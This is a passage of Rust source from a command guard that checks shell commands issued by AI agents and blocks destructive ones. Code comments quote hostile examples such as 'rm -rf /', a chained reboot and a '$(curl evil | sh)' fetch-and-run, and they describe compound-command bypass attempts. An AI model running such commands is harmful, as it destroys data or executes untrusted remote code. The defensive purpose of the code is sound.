/// ```ignore
/// use destructive_command_guard::evaluator::{evaluate_detailed, DetailedEvaluationResult};
/// use destructive_command_guard::config::Config;
///
/// let config = Config::load();
/// let result = evaluate_detailed("git reset --hard", &config);
///
/// println!("Decision: {:?}", result.result.decision);
/// println!("Evaluation time: {}μs", result.evaluation_time_us);
/// println!("Keywords checked: {:?}", result.keywords_checked);
/// ```
#[derive(Debug, Clone)]
pub struct DetailedEvaluationResult {
    /// The core evaluation result.
    pub result: EvaluationResult,
    /// Keywords that were checked during evaluation (from enabled packs).
    /// Useful for verbose mode to show what the quick-reject filter considered.
    pub keywords_checked: Vec<String>,
    /// Evaluation duration in microseconds.
    pub evaluation_time_us: u64,
    /// Confidence scoring result (if confidence scoring was applied).
    pub confidence: Option<ConfidenceResult>,
    /// The normalized form of the command (after path stripping).
    /// Useful for debugging to see what the pattern matcher actually evaluated.
    pub normalized_command: Option<String>,
    /// Whether quick-reject filtered out this command before pattern matching.
    pub quick_rejected: bool,
}

impl DetailedEvaluationResult {
    /// Check if the command was allowed.
    #[inline]
    #[must_use]
    pub fn is_allowed(&self) -> bool {
        self.result.is_allowed()
    }

    /// Check if the command was denied.
    #[inline]
    #[must_use]
    pub fn is_denied(&self) -> bool {
        self.result.is_denied()
    }

    /// Get the core evaluation result.
    #[inline]
    #[must_use]
    pub fn into_result(self) -> EvaluationResult {
        self.result
    }

    /// Get a reference to the core evaluation result.
    #[inline]
    #[must_use]
    pub const fn result(&self) -> &EvaluationResult {
        &self.result
    }
}

/// Evaluate a command with detailed timing and diagnostic information.
///
/// This function wraps [`evaluate_command`] and captures additional metadata
/// useful for verbose output, debugging, and the `dcg test` command.
///
/// # Arguments
///
/// * `command` - The raw command string to evaluate
/// * `config` - Loaded configuration with pack settings
///
/// # Returns
///
/// A [`DetailedEvaluationResult`] containing the evaluation result along with
/// timing information, keywords checked, and other diagnostic data.
///
/// # Performance
///
/// This function has slightly more overhead than [`evaluate_command`] due to
/// timing capture and metadata collection. For high-throughput hook mode,
/// prefer [`evaluate_command`] or [`evaluate_command_with_pack_order`].
///
/// # Example
///
/// ```ignore
/// use destructive_command_guard::evaluator::evaluate_detailed;
/// use destructive_command_guard::config::Config;
///
/// let config = Config::load();
/// let result = evaluate_detailed("git reset --hard", &config);
///
/// if result.is_denied() {
///     println!("Command blocked in {}μs", result.evaluation_time_us);
///     if let Some(info) = &result.result.pattern_info {
///         println!("Blocked by: {:?}", info.pack_id);
///     }
/// }
/// ```
#[must_use]
pub fn evaluate_detailed(command: &str, config: &Config) -> DetailedEvaluationResult {
    let allowlists = LayeredAllowlist::default();
    evaluate_detailed_with_allowlists(command, config, &allowlists)
}

/// Evaluate a command with detailed timing and diagnostic information, using custom allowlists.
///
/// This is the extended version of [`evaluate_detailed`] that accepts custom allowlists.
///
/// # Arguments
///
/// * `command` - The raw command string to evaluate
/// * `config` - Loaded configuration with pack settings
/// * `allowlists` - Layered allowlists (project/user/system)
///
/// # Returns
///
/// A [`DetailedEvaluationResult`] containing the evaluation result along with
/// timing information, keywords checked, and other diagnostic data.
#[must_use]
pub fn evaluate_detailed_with_allowlists(
    command: &str,
    config: &Config,
    allowlists: &LayeredAllowlist,
) -> DetailedEvaluationResult {
    use std::time::Instant;

    let start = Instant::now();

    // Collect enabled keywords for quick-reject tracking
    let enabled_packs = config.enabled_pack_ids();
    let enabled_keywords = REGISTRY.collect_enabled_keywords(&enabled_packs);
    let ordered_packs = REGISTRY.expand_enabled_ordered(&enabled_packs);
    let keyword_index = REGISTRY.build_enabled_keyword_index(&ordered_packs);
    let heredoc_settings = config.heredoc_settings();
    let compiled_overrides = config.overrides.compile();

    // Track quick-reject status
    let quick_rejected = pack_aware_quick_reject(command, &enabled_keywords);

    // Get normalized command for diagnostics
    let stripped = strip_wrapper_prefixes(command);
    let normalized = crate::normalize::normalize_command(stripped.normalized.as_ref());
    let normalized_command = if normalized.as_ref() != command {
        Some(normalized.into_owned())
    } else {
        None
    };

    // Perform evaluation
    let result = evaluate_command_with_pack_order(
        command,
        &enabled_keywords,
        &ordered_packs,
        keyword_index.as_ref(),
        &compiled_overrides,
        allowlists,
        &heredoc_settings,
    );

    let evaluation_time_us = start.elapsed().as_micros() as u64;

    // Apply confidence scoring if applicable
    let confidence = if result.is_denied() {
        let sanitized = sanitize_for_pattern_matching(command);
        let sanitized_str = if matches!(sanitized, std::borrow::Cow::Owned(_)) {
            Some(sanitized.as_ref())
        } else {
            None
        };
        let mode = result
            .effective_mode
            .unwrap_or(crate::packs::DecisionMode::Deny);
        Some(apply_confidence_scoring(
            command,
            sanitized_str,
            &result,
            mode,
            &config.confidence,
        ))
    } else {
        None
    };

    DetailedEvaluationResult {
        result,
        keywords_checked: enabled_keywords.iter().map(|s| (*s).to_string()).collect(),
        evaluation_time_us,
        confidence,
        normalized_command,
        quick_rejected,
    }
}

/// Evaluate a command against all patterns and packs using precompiled overrides.
///
/// This is the main entry point for command evaluation. It performs all checks
/// in the correct order and returns a structured result.
///
/// # Arguments
///
/// * `command` - The raw command string to evaluate
/// * `config` - Loaded configuration with pack settings
/// * `enabled_keywords` - Keywords from enabled packs for quick rejection
/// * `compiled_overrides` - Precompiled config overrides (avoids per-command regex compilation)
///
/// # Returns
///
/// An `EvaluationResult` indicating whether the command is allowed or denied,
/// with detailed pattern match information for denials.
///
/// # Performance
///
/// This function is optimized for the common case (allow):
/// - Quick rejection skips regex for 99%+ of commands
/// - Config overrides use precompiled regexes (no per-command compilation)
/// - Short-circuits on first match
#[must_use]
pub fn evaluate_command(
    command: &str,
    config: &Config,
    enabled_keywords: &[&str],
    compiled_overrides: &crate::config::CompiledOverrides,
    allowlists: &LayeredAllowlist,
) -> EvaluationResult {
    evaluate_command_with_deadline(
        command,
        config,
        enabled_keywords,
        compiled_overrides,
        allowlists,
        None,
    )
}

#[inline]
fn deadline_exceeded(deadline: Option<&Deadline>) -> bool {
    deadline.is_some_and(Deadline::is_exceeded)
}

#[inline]
fn contains_shell_word_obfuscation(command: &str) -> bool {
    command
        .as_bytes()
        .iter()
        .any(|b| matches!(b, b'\\' | b'\'' | b'"'))
}

#[inline]
fn remaining_below(deadline: Option<&Deadline>, budget: &crate::perf::Budget) -> bool {
    deadline.is_some_and(|d| !d.has_budget_for(budget))
}

fn resolve_project_path(
    heredoc_settings: &crate::config::HeredocSettings,
    project_path: Option<&Path>,
) -> Option<PathBuf> {
    // An explicit working directory is authoritative and must be honored
    // regardless of heredoc configuration. This value scopes *all* path-aware
    // allowlist matching (`match_rule_at_path`, `match_exact_command_at_path`,
    // …), not just heredoc content allowlists. Gating it behind the presence of
    // a heredoc `content_allowlist` (as this once did) meant `paths = [...]`
    // entries silently applied globally whenever no heredoc project allowlist
    // was configured — a real scope-escape (see #186).
    if let Some(path) = project_path {
        return Some(path.to_path_buf());
    }

    // No explicit path was threaded through. Only fall back to a `current_dir`
    // syscall when a heredoc content allowlist actually needs one; otherwise
    // preserve the historical `None` (path restrictions skipped) for callers
    // that deliberately pass no working directory.
    if heredoc_settings
        .content_allowlist
        .as_ref()
        .is_none_or(|a| a.projects.is_empty())
    {
        return None;
    }

    std::env::current_dir().ok()
}

fn allow_once_match(
    command: &str,
    allow_once_audit: Option<&crate::pending_exceptions::AllowOnceAuditConfig<'_>>,
) -> Option<crate::pending_exceptions::AllowOnceEntry> {
    let cwd = std::env::current_dir().ok()?;
    let store = AllowOnceStore::new(AllowOnceStore::default_path(Some(&cwd)));
    match store.match_command(command, &cwd, Utc::now(), allow_once_audit) {
        Ok(Some(entry)) => Some(entry),
        _ => None,
    }
}

#[allow(dead_code)]
fn allow_once_match_force_config(
    command: &str,
    allow_once_audit: Option<&crate::pending_exceptions::AllowOnceAuditConfig<'_>>,
) -> Option<crate::pending_exceptions::AllowOnceEntry> {
    let cwd = std::env::current_dir().ok()?;
    let store = AllowOnceStore::new(AllowOnceStore::default_path(Some(&cwd)));
    match store.match_command_force_config(command, &cwd, Utc::now(), allow_once_audit) {
        Ok(Some(entry)) => Some(entry),
        _ => None,
    }
}

/// Evaluate a command against all patterns and packs using a deadline.
///
/// When `deadline` is provided and exceeded, evaluation fails open and returns
/// `skipped_due_to_budget=true` so hook mode can allow the command safely.
#[must_use]
pub fn evaluate_command_with_deadline(
    command: &str,
    config: &Config,
    enabled_keywords: &[&str],
    compiled_overrides: &crate::config::CompiledOverrides,
    allowlists: &LayeredAllowlist,
    deadline: Option<&Deadline>,
) -> EvaluationResult {
    let enabled_packs: HashSet<String> = config.enabled_pack_ids();
    let ordered_packs = REGISTRY.expand_enabled_ordered(&enabled_packs);
    let keyword_index = REGISTRY.build_enabled_keyword_index(&ordered_packs);
    let heredoc_settings = config.heredoc_settings();
    evaluate_command_with_pack_order_deadline(
        command,
        enabled_keywords,
        &ordered_packs,
        keyword_index.as_ref(),
        compiled_overrides,
        allowlists,
        &heredoc_settings,
        None,
        deadline,
    )
}

/// Evaluate a command using a precomputed pack order.
///
/// This is the hot-path optimized variant for hook mode: callers can compute the
/// enabled pack set and expanded ordered pack list once at startup and reuse it
/// for every command invocation.
///
/// # Arguments
///
/// * `command` - The raw command string to evaluate
/// * `enabled_keywords` - Keywords from enabled packs for quick rejection
/// * `ordered_packs` - Expanded pack IDs in deterministic evaluation order
/// * `compiled_overrides` - Precompiled config overrides
/// * `allowlists` - Layered allowlists (project/user/system)
#[must_use]
pub fn evaluate_command_with_pack_order(
    command: &str,
    enabled_keywords: &[&str],
    ordered_packs: &[String],
    keyword_index: Option<&crate::packs::EnabledKeywordIndex>,
    compiled_overrides: &crate::config::CompiledOverrides,
    allowlists: &LayeredAllowlist,
    heredoc_settings: &crate::config::HeredocSettings,
) -> EvaluationResult {
    evaluate_command_with_pack_order_at_path(
        command,
        enabled_keywords,
        ordered_packs,
        keyword_index,
        compiled_overrides,
        allowlists,
        heredoc_settings,
        None,
    )
}

/// Evaluate a command using a precomputed pack order and an optional project path.
#[must_use]
#[allow(clippy::too_many_arguments)]
pub fn evaluate_command_with_pack_order_at_path(
    command: &str,
    enabled_keywords: &[&str],
    ordered_packs: &[String],
    keyword_index: Option<&crate::packs::EnabledKeywordIndex>,
    compiled_overrides: &crate::config::CompiledOverrides,
    allowlists: &LayeredAllowlist,
    heredoc_settings: &crate::config::HeredocSettings,
    project_path: Option<&Path>,
) -> EvaluationResult {
    evaluate_command_with_pack_order_deadline_at_path(
        command,
        enabled_keywords,
        ordered_packs,
        keyword_index,
        compiled_overrides,
        allowlists,
        heredoc_settings,
        None,
        project_path,
        None,
    )
}

/// Evaluate a command with deadline support for fail-open behavior.
///
/// This is the hook-mode entry point that supports budget enforcement.
/// If the deadline is exceeded at check points, returns `allowed_due_to_budget()`.
///
/// # Arguments
///
/// * `command` - The raw command string to evaluate
/// * `enabled_keywords` - Keywords from enabled packs for quick rejection
/// * `ordered_packs` - Ordered list of enabled pack IDs
/// * `compiled_overrides` - Precompiled config overrides
/// * `allowlists` - Layered allowlist for overrides
/// * `heredoc_settings` - Settings for heredoc analysis
/// * `deadline` - Optional deadline for fail-open behavior
///
/// # Returns
///
/// An `EvaluationResult` with `skipped_due_to_budget: true` if deadline exceeded.
#[must_use]
#[allow(clippy::too_many_arguments)]
pub fn evaluate_command_with_pack_order_deadline(
    command: &str,
    enabled_keywords: &[&str],
    ordered_packs: &[String],
    keyword_index: Option<&crate::packs::EnabledKeywordIndex>,
    compiled_overrides: &crate::config::CompiledOverrides,
    allowlists: &LayeredAllowlist,
    heredoc_settings: &crate::config::HeredocSettings,
    allow_once_audit: Option<&crate::pending_exceptions::AllowOnceAuditConfig<'_>>,
    deadline: Option<&Deadline>,
) -> EvaluationResult {
    evaluate_command_with_pack_order_deadline_at_path(
        command,
        enabled_keywords,
        ordered_packs,
        keyword_index,
        compiled_overrides,
        allowlists,
        heredoc_settings,
        allow_once_audit,
        None,
        deadline,
    )
}

/// Evaluate a command with deadline support and an optional project path.
#[must_use]
#[allow(clippy::too_many_arguments)]
#[allow(clippy::too_many_lines)]
pub fn evaluate_command_with_pack_order_deadline_at_path(
    command: &str,
    enabled_keywords: &[&str],
    ordered_packs: &[String],
    keyword_index: Option<&crate::packs::EnabledKeywordIndex>,
    compiled_overrides: &crate::config::CompiledOverrides,
    allowlists: &LayeredAllowlist,
    heredoc_settings: &crate::config::HeredocSettings,
    allow_once_audit: Option<&crate::pending_exceptions::AllowOnceAuditConfig<'_>>,
    project_path: Option<&Path>,
    deadline: Option<&Deadline>,
) -> EvaluationResult {
    // Check deadline at entry - if already exceeded, fail-open immediately.
    if deadline_exceeded(deadline) {
        return EvaluationResult::allowed_due_to_budget();
    }

    // Empty commands are allowed (no-op)
    if command.is_empty() {
        return EvaluationResult::allowed();
    }

    // Step 1: Check precompiled block overrides first. Deny wins when
    // allow/block override patterns overlap; only a force allow-once exception
    // may intentionally bypass an explicit config block.
    if let Some(reason) = compiled_overrides.check_block(command) {
        if allow_once_match_force_config(command, allow_once_audit).is_some() {
            return EvaluationResult::allowed();
        }
        return EvaluationResult::denied_by_config(reason.to_string());
    }

    // Step 1.5: Check precompiled allow overrides after blocks.
    if compiled_overrides.check_allow(command) {
        return EvaluationResult::allowed();
    }

    // Step 2: Self-inspection exemption (dcg#170).
    //
    // dcg's own diagnostic subcommands -- `dcg test`, `dcg explain`,
    // `dcg classify` -- accept a candidate command *as data* and report a
    // decision without ever executing it. When dcg runs as a PreToolUse hook,
    // an agent invoking one of these diagnostics (e.g. to reproduce a false
    // positive) would otherwise be blocked because the raw command line
    // contains the destructive-looking candidate -- the very report the agent
    // is trying to read. This runs *before* heredoc scanning (Step 3) and
    // keyword/pack evaluation, so candidates embedded in heredocs or `$'...'`
    // ANSI-C strings are also exempted (the issue's exact repro).
    //
    // The guard is precise and cannot be turned into a general bypass: every
    // shell-split segment must itself be a bare `dcg <diagnostic>` invocation
    // with no output redirection, so chained real commands, command
    // substitutions, process substitutions, and redirects all fall through to
    // normal evaluation and are blocked as usual. A user-configured block
    // override (Step 1) still wins. See dcg#132 for the analogous `ee preflight`
    // inspection-wrapper exemption.
    if crate::allowlist::is_dcg_self_inspection_call(command) {
        return EvaluationResult::allowed();
    }

    if deadline_exceeded(deadline) {
        return EvaluationResult::allowed_due_to_budget();
    }

    // Step 3: Heredoc / inline-script detection (Tier 1/2/3, fail-open).
    let mut precomputed_sanitized = None;
    let mut heredoc_allowlist_hit: Option<(PatternMatch, AllowlistLayer, String)> = None;

    let project_path = resolve_project_path(heredoc_settings, project_path);
    let project_path = project_path.as_deref();

    if heredoc_settings.enabled {
        if remaining_below(deadline, &crate::perf::HEREDOC_TRIGGER) {
            return EvaluationResult::allowed_due_to_budget();
        }

        if check_triggers(command) == TriggerResult::Triggered {
            let sanitized = sanitize_for_pattern_matching(command);
            let sanitized_str = sanitized.as_ref();
            let should_scan = if matches!(sanitized, std::borrow::Cow::Owned(_)) {
                check_triggers(sanitized_str) == TriggerResult::Triggered
            } else {
                true
            };
            precomputed_sanitized = Some(sanitized);

            if should_scan {
                let context = HeredocEvaluationContext {
                    allowlists,
                    heredoc_settings,
                    project_path,
                    deadline,
                    enabled_keywords,
                    ordered_packs,
                    keyword_index,
                    compiled_overrides,
                    allow_once_audit,
                };
                if let Some(blocked) =
                    evaluate_heredoc(command, context, &mut heredoc_allowlist_hit)
                {
                    return blocked;
                }
            }
        }
    }

    if deadline_exceeded(deadline) {
        return EvaluationResult::allowed_due_to_budget();
    }

    // Step 4: Quick rejection - if no relevant keywords, allow immediately.
    //
    // Fast path: when an Aho-Corasick keyword index is available, a single-pass
    // AC scan (O(n)) replaces the N×memmem per-keyword scan. If the AC says no
    // keyword appears in the raw command, we can skip the more expensive
    // normalize+span-classify path in pack_aware_quick_reject entirely.
    if let Some(index) = keyword_index {
        if !index.has_any_keyword(command) && !contains_shell_word_obfuscation(command) {
            if let Some((matched, layer, reason)) = heredoc_allowlist_hit {
                return EvaluationResult::allowed_by_allowlist(matched, layer, reason);
            }
            return EvaluationResult::allowed();
        }
    } else if pack_aware_quick_reject(command, enabled_keywords) {
        if let Some((matched, layer, reason)) = heredoc_allowlist_hit {
            return EvaluationResult::allowed_by_allowlist(matched, layer, reason);
        }
        return EvaluationResult::allowed();
    }

    if deadline_exceeded(deadline) {
        return EvaluationResult::allowed_due_to_budget();
    }

    // Step 5: False-positive immunity - strip known-safe string arguments (commit messages, search
    // patterns, issue descriptions, etc.) so dangerous substrings inside data do not trigger
    // blocking.
    //
    // Also normalize the command here (Step 6) and reuse for pack evaluation.
    // pack_aware_quick_reject_with_normalized returns both the quick-reject decision
    // and the normalized command, avoiding duplicate normalization.
    let sanitized = precomputed_sanitized.unwrap_or_else(|| sanitize_for_pattern_matching(command));
    let command_for_match = sanitized.as_ref();

    // Use the optimized version that returns both decision and normalized form.
    let (quick_reject, normalized) =
        pack_aware_quick_reject_with_normalized(command_for_match, enabled_keywords);
    if quick_reject
        && !should_check_original_control_plane_payload_for_any_pack(
            command_for_match,
            command,
            ordered_packs,
        )
    {
        if let Some((matched, layer, reason)) = heredoc_allowlist_hit {
            return EvaluationResult::allowed_by_allowlist(matched, layer, reason);
        }
        return EvaluationResult::allowed();
    }

    if deadline_exceeded(deadline) {
        return EvaluationResult::allowed_due_to_budget();
    }

    // Deferred allow-once check: moved here from before keyword quick-reject.
    // Allow-once entries only exist for previously blocked commands, which must
    // have matched keywords — so deferring past quick-reject is safe and avoids
    // ~65µs of filesystem I/O on every unrelated command.
    if allow_once_match(command, allow_once_audit).is_some() {
        return EvaluationResult::allowed();
    }

    // Built-in inspection-wrapper exemption (dcg#132).
    //
    // A small, hard-coded set of "inspection wrapper" prefixes
    // (e.g. `ee preflight check --cmd`) consume the trailing destructive
    // command as data rather than executing it. We must let them through
    // before pack evaluation, or `dcg` will substring-match the destructive
    // verb inside the analyzed argument and block the wrapper itself —
    // exactly the false positive that filed dcg#132. Each prefix is
    // evaluated by `command_prefix_safely_matches`, which enforces the
    // same token-boundary + no-shell-chain-metacharacter guard used by
    // user `command_prefix` allowlists. So a tail like
    // `--cmd "rm -rf /"` allows through, but
    // `--cmd "rm -rf /" ; reboot`, `--cmd "$(curl evil | sh)"`, etc.
    // refuse the exemption and fall through to normal pack evaluation.
    //
    // We check both the raw command and the normalized form: the raw form
    // is the agent-typed string we actually want to recognize; the
    // normalized form is the belt-and-suspenders fallback if a future
    // wrapper sneaks in via a path-stripped binary name.
    if crate::allowlist::is_builtin_inspection_wrapper_call(command)
        || crate::allowlist::is_builtin_inspection_wrapper_call(&normalized)
    {
        return EvaluationResult::allowed();
    }

    // Check exact command, prefix, and pattern allowlists (reusing normalized
    // from quick-reject). Use path-aware matching for context-aware
    // allowlisting (Epic 5). Pattern entries must additionally have
    // `risk_acknowledged = true` (enforced inside the matcher's validity check).
    if allowlists
        .match_exact_command_at_path(&normalized, project_path)
        .is_some()
        || allowlists
            .match_command_prefix_at_path(&normalized, project_path)
            .is_some()
        || allowlists
            .match_pattern_at_path(&normalized, project_path)
            .is_some()
    {
        return EvaluationResult::allowed();
    }

    // Step 7: Mask heredoc content for non-executing targets (cat, tee, etc.)
    // This prevents false positives where documentation text containing dangerous
    // patterns like "rm -rf /" in heredocs to cat/tee triggers blocking.
    let masked = crate::heredoc::mask_non_executing_heredocs(&normalized);
    let command_for_packs = masked.as_ref();

    let result = evaluate_packs_with_allowlists(
        command_for_packs,
        &normalized,
        command_for_match,
        command,
        ordered_packs,
        allowlists,
        keyword_index,
        None,
        project_path,
    );
    if result.allowlist_override.is_none() {
        if let Some((matched, layer, reason)) = heredoc_allowlist_hit {
            return EvaluationResult::allowed_by_allowlist(matched, layer, reason);
        }
    }

    result
}

#[allow(clippy::too_many_lines)]
#[allow(clippy::too_many_arguments)]
fn evaluate_packs_with_allowlists(
    command_for_packs: &str,
    normalized: &str,
    command_for_match: &str,
    original_command: &str,
    ordered_packs: &[String],
    allowlists: &LayeredAllowlist,
    keyword_index: Option<&crate::packs::EnabledKeywordIndex>,
    deadline: Option<&Deadline>,
    project_path: Option<&Path>,
) -> EvaluationResult {
    if deadline_exceeded(deadline) || remaining_below(deadline, &crate::perf::PATTERN_MATCH) {
        return EvaluationResult::allowed_due_to_budget();
    }

    // Pre-compute which packs might match.
    //
    // When a keyword index is available, use a single global substring scan to
    // conservatively select candidate packs (superset of legacy PackEntry::might_match).
    // Otherwise, fall back to the per-pack metadata scan.
    //
    // External packs from custom_paths are also checked alongside built-in packs.
    let external_store = crate::packs::get_external_packs();
    let candidate_packs: Vec<(&String, &crate::packs::Pack)> = keyword_index.map_or_else(
        || {
            ordered_packs
                .iter()
                .filter_map(|pack_id| {
                    // Try built-in registry first
                    if let Some(entry) = REGISTRY.get_entry(pack_id) {
                        if !entry.might_match(command_for_packs)
                            && !should_check_original_control_plane_payload(
                                pack_id,
                                command_for_packs,
                                original_command,
                            )
                        {
                            return None;
                        }
                        return Some((pack_id, entry.get_pack()));
                    }
                    // Fallback to external packs
                    if let Some(store) = external_store {
                        if let Some(pack) = store.get(pack_id) {
                            if !pack.might_match(command_for_packs)
                                && !should_check_original_control_plane_payload(
                                    pack_id,
                                    command_for_packs,
                                    original_command,
                                )
                            {
                                return None;
                            }
                            return Some((pack_id, pack));
                        }
                    }
                    None
                })
                .collect()
        },
        |index| {
            let mask = index.candidate_pack_mask(command_for_packs);
            ordered_packs
                .iter()
                .enumerate()
                .filter_map(|(i, pack_id)| {
                    if (mask >> i) & 1 == 0
                        && !should_check_original_control_plane_payload(
                            pack_id,
                            command_for_packs,
                            original_command,
                        )
                    {
                        return None;
                    }
                    // Try built-in registry first
                    if let Some(entry) = REGISTRY.get_entry(pack_id) {
                        return Some((pack_id, entry.get_pack()));
                    }
                    // Fallback to external packs
                    if let Some(store) = external_store {
                        if let Some(pack) = store.get(pack_id) {
                            return Some((pack_id, pack));
                        }
                    }
                    None
                })
                .collect()
        },
    );

    let has_filesystem_pack = candidate_packs
        .iter()
        .any(|(pack_id, _)| pack_id.as_str() == "core.filesystem");
    let rm_parse = has_filesystem_pack
        .then(|| crate::packs::core::filesystem::parse_rm_command(command_for_packs));

    let normalized_offset = compute_normalized_offset(command_for_match, normalized);
    let original_len = original_command.len();
    let segment_ranges = command_segment_ranges(command_for_packs);
    let has_compound_segments = segment_ranges.len() > 1;

    // Single-pass per-pack evaluation: safe patterns only protect their own pack's
    // destructive patterns, not other packs. This prevents compound command bypass
    // where e.g., "git checkout -b foo" safe pattern would whitelist "rm -rf / ; git checkout -b foo".
    //
    // For each pack:
    // 1. Check safe patterns - if match, skip this pack's destructive patterns (continue)
    // 2. Check destructive patterns - if match, block (unless allowlisted)
    //
    // The rm_parse optimization for core.filesystem is handled inline.
    let mut first_allowlist_hit: Option<(PatternMatch, AllowlistLayer, String)> = None;

    for &(pack_id, pack) in &candidate_packs {
        if deadline_exceeded(deadline) || remaining_below(deadline, &crate::perf::PATTERN_MATCH) {
            return EvaluationResult::allowed_due_to_budget();
        }

        // Check safe patterns for this pack first.
        // If a safe pattern matches, skip this pack's destructive patterns only.
        // This prevents compound command bypass where one pack's safe pattern
        // would whitelist destructive commands from other packs.
        if pack_id == "core.filesystem" {
            let has_pre_rm_propagation_match = pack.destructive_patterns.iter().any(|pattern| {
                crate::packs::core::filesystem::is_pre_rm_propagation_rule(pattern.name)
                    && pattern.regex.is_match(command_for_packs)
            });

            // core.filesystem uses rm_parse for more accurate safe pattern detection
            match rm_parse.as_ref() {
                Some(crate::packs::core::filesystem::RmParseDecision::Allow)
                    if !has_pre_rm_propagation_match =>
                {
                    continue; // Safe pattern match - skip this pack
                }
                Some(crate::packs::core::filesystem::RmParseDecision::Allow) => {
                    // A sensitive-source propagation chain matched before the rm
                    // fast path. Fall through to the ordinary destructive-pattern
                    // loop so allowlists, spans, explanations, and suggestions are
                    // handled consistently.
                }
                Some(crate::packs::core::filesystem::RmParseDecision::NoMatch) | None => {
                    // rm_parse didn't find rm command or wasn't computed, check safe patterns as fallback
                    if pack.matches_safe_with_deadline(command_for_packs, deadline) {
                        continue;
                    }
                }
                Some(crate::packs::core::filesystem::RmParseDecision::Deny(hit)) => {
                    if let Some(allow_hit) =
                        allowlists.match_rule_at_path(pack_id, hit.pattern_name, project_path)
                    {
                        if first_allowlist_hit.is_none() {
                            let span = hit.span.as_ref().map(|span| MatchSpan {
                                start: span.start,
                                end: span.end,
                            });
                            let mapped_span = span.and_then(|span| {
                                map_span_with_offset(span, normalized_offset, original_len)
                            });
                            let preview = mapped_span
                                .as_ref()
                                .map(|span| extract_match_preview(original_command, span))
                                .or_else(|| {
                                    span.as_ref()
                                        .map(|span| extract_match_preview(command_for_packs, span))
                                });
                            first_allowlist_hit = Some((
                                PatternMatch {
                                    pack_id: Some(pack_id.clone()),
                                    pattern_name: Some(hit.pattern_name.to_string()),
                                    severity: Some(hit.severity),
                                    reason: hit.reason.to_string(),
                                    source: MatchSource::Pack,
                                    matched_span: mapped_span,
                                    matched_text_preview: preview,
                                    explanation: None,
                                    suggestions: &[],
                                },
                                allow_hit.layer,
                                allow_hit.entry.reason.clone(),
                            ));
                        }
                        continue;
                    }

                    if let Some(span) = hit.span.as_ref().map(|span| MatchSpan {
                        start: span.start,
                        end: span.end,
                    }) {
                        if let Some(mapped_span) =
                            map_span_with_offset(span, normalized_offset, original_len)
                        {
                            return EvaluationResult::denied_by_pack_pattern_with_span(
                                pack_id,
                                hit.pattern_name,
                                hit.reason,
                                None,
                                hit.severity,
                                &[], // fast_match path doesn't have suggestions
                                original_command,
                                mapped_span,
                            );
                        }
                    }

                    return EvaluationResult::denied_by_pack_pattern(
                        pack_id,
                        hit.pattern_name,
                        hit.reason,
                        None,
                        hit.severity,
                        &[], // fast_match path doesn't have suggestions
                    );
                }
            }
        } else if has_compound_segments {
            for &(segment_start, segment_end) in &segment_ranges {
                if deadline_exceeded(deadline)
                    || remaining_below(deadline, &crate::perf::PATTERN_MATCH)
                {
                    return EvaluationResult::allowed_due_to_budget();
                }

                let segment = &command_for_packs[segment_start..segment_end];
                let sanitized_segment = sanitize_for_pattern_matching(segment);
                let segment_for_match = sanitized_segment.as_ref();

                if pack.matches_safe_with_deadline(segment_for_match, deadline) {
                    continue;
                }

                let nested_segment_ranges: Vec<(usize, usize)> = segment_ranges
                    .iter()
                    .copied()
                    .filter(|&(nested_start, nested_end)| {
                        nested_start >= segment_start
                            && nested_end <= segment_end
                            && !(nested_start == segment_start && nested_end == segment_end)
                    })
                    .collect();

                if let Some(result) = evaluate_pack_destructive_patterns(
                    pack_id,
                    pack,
                    segment_for_match,
                    segment_start,
                    original_command,
                    normalized_offset,
                    original_len,
                    allowlists,
                    project_path,
                    &mut first_allowlist_hit,
                    deadline,
                    &nested_segment_ranges,
                ) {
                    return result;
                }
            }
        } else if pack.matches_safe_with_deadline(command_for_packs, deadline) {
            continue; // Safe pattern match - skip this pack's destructive patterns
        }

        for pattern in &pack.destructive_patterns {
            if deadline_exceeded(deadline) || remaining_below(deadline, &crate::perf::PATTERN_MATCH)
            {
                return EvaluationResult::allowed_due_to_budget();
            }

            // All severity levels are now evaluated. The policy layer in main.rs
            // determines whether to deny, warn, or log based on severity and config.

            let matched_span = pattern
                .regex
                .find(command_for_packs)
                .map(|(start, end)| MatchSpan { start, end });

            if deadline_exceeded(deadline) {
                return EvaluationResult::allowed_due_to_budget();
            }

            let Some(span) = matched_span else {
                continue;
            };

            // Non-filesystem packs already checked each segment above, so skip
            // duplicate full-command matches that sit wholly inside one segment.
            // core.filesystem uses its specialized rm parser instead of that
            // segment loop; keep its full-command regex fallback visible.
            if has_compound_segments
                && pack_id != "core.filesystem"
                && span_is_inside_any_segment(span, &segment_ranges)
            {
                continue;
            }

            let reason = pattern.reason;
            let mapped_span = map_span_with_offset(span, normalized_offset, original_len);
            let preview = mapped_span
                .as_ref()
                .map(|span| extract_match_preview(original_command, span))
                .or_else(|| Some(extract_match_preview(command_for_packs, &span)));

            // Allowlist check: only applies when we have a stable match identity (named pattern).
            if let Some(pattern_name) = pattern.name {
                if let Some(hit) =
                    allowlists.match_rule_at_path(pack_id, pattern_name, project_path)
                {
                    if first_allowlist_hit.is_none() {
                        first_allowlist_hit = Some((
                            PatternMatch {
                                pack_id: Some(pack_id.clone()),
                                pattern_name: Some(pattern_name.to_string()),
                                severity: Some(pattern.severity),
                                reason: reason.to_string(),
                                source: MatchSource::Pack,
                                matched_span: mapped_span,
                                matched_text_preview: preview,
                                explanation: pattern.explanation.map(str::to_string),
                                suggestions: pattern.suggestions,
                            },
                            hit.layer,
                            hit.entry.reason.clone(),
                        ));
                    }

                    // Bypass only this rule and keep evaluating other rules/packs.
                    continue;
                }

                if let Some(mapped_span) = mapped_span {
                    return EvaluationResult::denied_by_pack_pattern_with_span(
                        pack_id,
                        pattern_name,
                        reason,
                        pattern.explanation,
                        pattern.severity,
                        pattern.suggestions,
                        original_command,
                        mapped_span,
                    );
                }

                return EvaluationResult::denied_by_pack_pattern(
                    pack_id,
                    pattern_name,
                    reason,
                    pattern.explanation,
                    pattern.severity,
                    pattern.suggestions,
                );
            }

            if let Some(mapped_span) = mapped_span {
                return EvaluationResult::denied_by_pack_with_span(
                    pack_id,
                    reason,
                    pattern.explanation,
                    original_command,
                    mapped_span,
                );
            }

            return EvaluationResult::denied_by_pack(pack_id, reason, pattern.explanation);
        }

        if let Some(result) = evaluate_original_control_plane_payloads(
            pack_id.as_str(),
            pack,
            command_for_packs,
            original_command,
            allowlists,
            project_path,
            &mut first_allowlist_hit,
            deadline,
        ) {
            return result;
        }
    }

    if let Some((matched, layer, reason)) = first_allowlist_hit {
        return EvaluationResult::allowed_by_allowlist(matched, layer, reason);
    }

    EvaluationResult::allowed()
}

#[allow(clippy::too_many_arguments)]
